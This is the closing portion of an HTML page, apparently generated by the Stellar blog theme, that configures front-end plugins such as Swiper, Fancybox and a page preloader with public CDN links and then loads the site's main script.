    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
  }
  if ('' == 'true') {
    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://fastly.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
  }
  if ('true' == 'true') {
    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://fastly.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://fastly.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
  }
  if ('true' == 'true') {
    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
  }
  if ('false' == 'true') {
    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
  }
</script>

<!-- required -->

  
<script src="/js/main.js" async></script>



<!-- optional -->



<!-- inject -->


  </div>
</body>
</html>
